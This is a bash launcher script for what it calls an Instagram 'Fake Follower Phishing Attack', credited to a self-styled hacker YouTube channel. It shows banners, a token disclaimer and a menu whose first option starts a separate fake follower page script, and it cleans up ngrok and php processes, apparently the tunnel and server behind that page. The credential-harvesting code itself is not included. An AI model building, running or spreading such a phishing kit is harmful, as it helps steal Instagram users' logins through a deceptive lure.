#!/bin/bash
# Coded by: Keerthan @Expert Hacker
# Follow us on Youtube: Youtube.com/Expert Hacker
# Instagram Fake Follower Phishing Aattack
clear
trap 'printf "\n";stop;exit 1' 2

echo "
███████╗░█████╗░██╗░░░░░██╗░░░░░░█████╗░░██╗░░░░░░░██╗
██╔════╝██╔══██╗██║░░░░░██║░░░░░██╔══██╗░██║░░██╗░░██║
█████╗░░██║░░██║██║░░░░░██║░░░░░██║░░██║░╚██╗████╗██╔╝
██╔══╝░░██║░░██║██║░░░░░██║░░░░░██║░░██║░░████╔═████║░
██║░░░░░╚█████╔╝███████╗███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░
╚═╝░░░░░░╚════╝░╚══════╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░

███╗░░░███╗███████╗
████╗░████║██╔════╝
██╔████╔██║█████╗
██║╚██╔╝██║██╔══╝ On Instagram 😜
██║░╚═╝░██║███████╗
╚═╝░░░░░╚═╝╚══════╝" |lolcat

stop() {
#menu
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi

}
echo "-----------------------------------------------------------------------------"
printf "  \e[101m\e[1;77m::  Disclaimer: Developers assume no liability and are not ::\e[0m\n"
printf "  \e[101m\e[1;77m::  Responcible for any missuse or damage caused by this tool ::\e[0m\n"
echo " "
echo "           Coded By KEERTHAN" |lolcat
echo " "
echo "YouTube : www.YoutTube.com/Expert Hacker" |lolcat
##############
##MMENU DRIVEN
#############
sleep 1
echo "-------------------------------------------------"
echo "                      MENU"
echo "-------------------------------------------------"
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Fake Instagram Followers page \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m About Us\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Exit \e[0m\n"
echo "------------------------------------------------------------------------------"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter Your Choice: \e[0m' option
#menu


if [[ $option == 1 ]]; then
bash fdemo2.sh
elif [[ $option == 2 ]]; then
echo " "
echo " "
clear
blue='\033[1;32m'
sleep 2
 echo "                      Coded BY >>>>> KEERTHAN >>>>>" |lolcat
sleep 1
echo "                      YouTube Channel: Expert Hacker" |lolcat
sleep 1
echo -e "[ ✔ ] Follow Us on YouTube : https://www.youtube.com/channel/UC5GjaNLtyqJD8gkm7MI7f_A?view_as=subscriber"
echo -e "[ ✔ ] HAPPY HACKING ...DON'T FORGOT TO SUBSCRIBE"
sleep 3


clear
bash followme.sh
elif [[ $option == 3 ]]; then
   echo "[ Bye..Bye..Have a Good day :) ]"
sleep 2
clear
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 2
clear
bash followme.sh

fi
